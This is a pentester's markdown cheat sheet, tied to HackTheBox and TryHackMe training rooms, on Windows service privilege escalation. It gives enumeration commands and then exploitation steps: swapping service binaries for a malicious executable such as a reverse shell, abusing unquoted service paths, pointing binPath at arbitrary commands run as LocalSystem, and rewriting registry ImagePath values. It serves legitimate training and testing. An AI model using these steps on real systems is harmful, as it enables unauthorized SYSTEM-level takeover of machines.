# Windows services

[![windows_privilege_escalation](../../../../_badges/htb/windows_privilege_escalation.svg)](https://academy.hackthebox.com/course/preview/windows-privilege-escalation)
[![windowsprivesc20](../../../../_badges/thmp/windowsprivesc20.svg)](https://tryhackme.com/room/windowsprivesc20)

<div class="row row-cols-lg-2"><div>

You can learn more about Windows services [here](/operating-systems/windows/_knowledge/index.md#windows-services).

* 🗺️ List services

```shell!
PS> Get-Service
PS> net start
PS> sc.exe query # with infos
```

* 🔎 Get more info about a service

```shell!
PS> sc.exe qc xxx
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: xxx
  [...]
  BINARY_PATH_NAME   : C:\[...]\service.exe
  [...]
```
</div><div>

* 🔑 To view the permissions of the user on a service

```shell!
PS> .\PsService.exe security service_name
PS> sc.exe sdshow service_name
PS> accesschk.exe ./xxx.exe -v
PS> accesschk.exe /accepteula -quvcw ./xxx.exe
```

🔥 In CTFs, you may be able to start/stop the service manually, while you may also do that if you are a [server operator](privs.md#server-operators).

```shell!
PS> sc.exe stop xxx
PS> # do your job
PS> sc.exe start xxx
```

🍀 Notable services: `vss`, `dns`, `Spooler`, `wuauserv`, `AppReadiness`, etc.
</div></div>

<hr class="sep-both">

## Pentester Notes ☠️

<div class="row row-cols-lg-2"><div>

#### Insecure permissions

[![windows_privilege_escalation](../../../../_badges/htb/windows_privilege_escalation.svg)](https://academy.hackthebox.com/course/preview/windows-privilege-escalation)
[![windowsprivesc20](../../../../_badges/thmp/windowsprivesc20.svg)](https://tryhackme.com/room/windowsprivesc20)

The current user may be able to replace the service with a malicious executable (ex: revshell.exe)

```shell!
PS> icacls C:\[...]\service.exe
PS> move C:\[...]\service.exe C:\[...]\service.exe.old
PS> icacls C:\[...]\malicious.exe /grant Everyone:F
```

<br>

#### Unquoted Service Path

[![windows_privilege_escalation](../../../../_badges/htb/windows_privilege_escalation.svg)](https://academy.hackthebox.com/course/preview/windows-privilege-escalation)
[![windowsprivesc20](../../../../_badges/thmp/windowsprivesc20.svg)](https://tryhackme.com/room/windowsprivesc20)
[![steelmountain](../../../../_badges/thmp-p/steelmountain.svg)](https://tryhackme.com/room/steelmountain)

If the service is using a PATH in which there are spaces, the service isn't quoted, and the hacker can create files, then the hacker may create an executable that is executed with the rest of the path in argument.

```shell!
PS> icacls $Env:appdata\Vulnerable Program\service.exe
PS> move C:\[...]\malicious.exe $Env:appdata\Vulnerable.exe
PS> # the service will execute
PS> # $Env:appdata\Vulnerable.exe Program\service.exe
```

You can find such services using:

```shell!
CMD> wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

```shell!
PS> wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | Where-Object {$_ -notmatch '".*?"' -and $_ -match '\S'}
```
</div><div>

#### Insecure Service Permissions

[![windows_privilege_escalation](../../../../_badges/htb/windows_privilege_escalation.svg)](https://academy.hackthebox.com/course/preview/windows-privilege-escalation)
[![windowsprivesc20](../../../../_badges/thmp/windowsprivesc20.svg)](https://tryhackme.com/room/windowsprivesc20)
[![return](../../../../_badges/htb-p/return.svg)](https://app.hackthebox.com/machines/Return)

It occurs if we can edit the permissions of a service, such as being able to change the location of the binary. Use the [accesschk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) command. If the user is granted `SERVICE_ALL_ACCESS` on the service, then have fun.

```shell!
PS> sc.exe config xxx binPath=C:\[...]\malicious.exe
PS> sc.exe config xxx binPath=C:\[...]\malicious.exe obj= LocalSystem
```

A common approach to execute a command is to use:

```ps
PS> sc.exe config XXX binPath= "cmd /c <some command here>"
PS> sc.exe config XXX binPath= "C:\windows\system32\cmd.exe /c <some command here>"
PS> sc.exe start XXX # fails but executed the command
```

<br>

#### Insecure Registry

[![windows_privilege_escalation](../../../../_badges/htb/windows_privilege_escalation.svg)](https://academy.hackthebox.com/course/preview/windows-privilege-escalation)

Windows stores in `hklm\System\CurrentControlSet\services` variable service configurations. ImagePath reference the path to the executable related to a service. We may be able to override some values:

Detect

```shell!
PS> .\accesschk.exe /accepteula -kvuqsw hklm\System\CurrentControlSet\services
```

Exploit

```shell!
PS> Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\XXX -Name "ImagePath" -Value "<some command here>"
PS> Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\XXX -Name "ImagePath" -Value "C:/<path_to_executable>"
```

<br>

#### Well-Known CVEs

* [PrintNightmare](https://github.com/cube0x0/CVE-2021-1675) (CVE-2021-1675) vulnerability in Spooler service.
</div></div>

<hr class="sep-both">

## 👻 To-do 👻

Stuff that I found, but never read/used yet.

<div class="row row-cols-lg-2"><div>

* It's recommended to use service accounts for services.
* Most services run with LocalSystem privileges by default
* From the SCM, we can configure an application to be executed if a service fails. If one was configured, it can be exploited.
</div><div>
</div></div>